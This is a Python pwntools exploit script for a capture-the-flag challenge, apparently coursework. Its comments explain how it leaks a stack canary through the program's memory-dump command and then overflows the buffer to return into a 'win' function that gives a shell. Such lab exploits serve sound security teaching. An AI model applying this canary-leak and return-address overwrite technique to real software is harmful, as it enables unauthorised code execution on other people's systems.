#!/usr/bin/env python3
from pwn import *

# Before creating the script:
# This program first provides a 'useful stack pointer'. Whilst I was initially confused
# about what was at this address, I eventually realised it was the start of a buffer.

# We are then presented with four commands we can use. The first 'input data' allows
# me to pass in data to this buffer mentioned above. The second command 'dump memory'
# reads from this same buffer we wrote to, and if given an address it prints the contents
# of this address. The third option 'print memory map' shows the location of the
# stack, heap etc., and the final option 'quit' returns from main.

# Through looking in binary ninja, I found a function called 'win' at location 0x80486c6 (bottom right of binary ninja for address)
# which provides shell access. Hence, I determined like earlier challenges that I would
# want to create a buffer overflow to overwrite the return address to jump to 'win'.

# However, when we perform a buffer overflow as usual to determine the location of
# the return address, we get the prompt 'stack smashing detected', which suggests a
# stack canary exists. This means we will first have to leak the value of the canary, 
# and only then can we do the buffer overflow (ensuring that we maintain the canary when doing so).

# To first leak the canary value, we need to determine its address. Whilst using the
# command 'canary' in pwndbg can give us this (as well as its value), since the 
# addresses on the stack change each time I run the program, I actually need the
# canarys address relative to my buffer.

# When looking in binary ninja, we can see at the start of main a value is copied from
# the gs register onto the stack at address ebp-0x8. This is actually the canary, and
# from this we can gather it is 0x8 (or 8 bytes) below/before the EBP register.

# To determine where EBP is in relation to the buffer, I ran the program in pwndbg,
# which provided me with the address for both the ESP and EBP. Using all these addresses,
# I could construct the following map of the stack:

# 0...
# 0xffffce18 - ESP
# 0xffffce27 - Buffer
# 0xffffce90 - Canary (8 bytes below EBP as found earlier)
# 0xffffce98 - EBP
# 0xffffce9c - EIP (since EBP is 4 bytes long, EIP must be 4 bytes above it)
# ffff...

# Given the address for the buffer and the canary (in this instance), we can calculate
# that there is an offset of 105 bytes. So, we extract the address of the buffer from
# the programs output, add 105 to it, and then we give this address as input to the
# command 'input data'. This places the address into the buffer, and then command
# 'dump memory' will print the contents of this address, being the value of the canary.

# We can then extract this, and construct our buffer overflow to include it so it does
# not appear to be overwritten. Our buffer overflow will be 96 bytes of anything, then
# the canary, then 8 bytes of anything, and then the address of the win function. We
# pass this payload into the 'input data' command, and then when we use the 'quit'
# command, we are given shell access as desired.

# The script:
p = remote("plsdonthaq.me", 2004)

# We want to extract the 'useful stack pointer', which is the address of the buffer
p.recvuntil("pointer ")
useful = int(p.recvline()[:-1], 0)

# Since we know the canary is stored 105 bytes above the buffer, we add this offset to
# the buffers address
canaryAddress = useful + 105

# We then select command 'input data' and send the address of the canary as input
p.sendline("a")
p.sendline(p32(canaryAddress))

# We use command 'dump memory' to display the contents of this address, here being
# the stack canary value.
p.sendline("b")

# Here we extract the canary value given by the program
p.recvuntil("memory at ")
p.recvuntil(": ")
canaryValue = u32(p.recv(4))

# Since we found the address of the win function in binary ninja, we store it in a variable
# to be used in the buffer overflow
win = int("0x80486c6", 0)

# We use command 'input data' to send through our buffer overflow, which is 96 bytes of
# anything, the canary, 8 bytes of anything, and the address of the win function
p.sendline("a")
p.sendline(b"A"*96 + p32(canaryValue) + b"A"*8 + p32(win))

# We then use command 'quit' to return to the win function which gives us shell access
p.sendline("d")
p.interactive()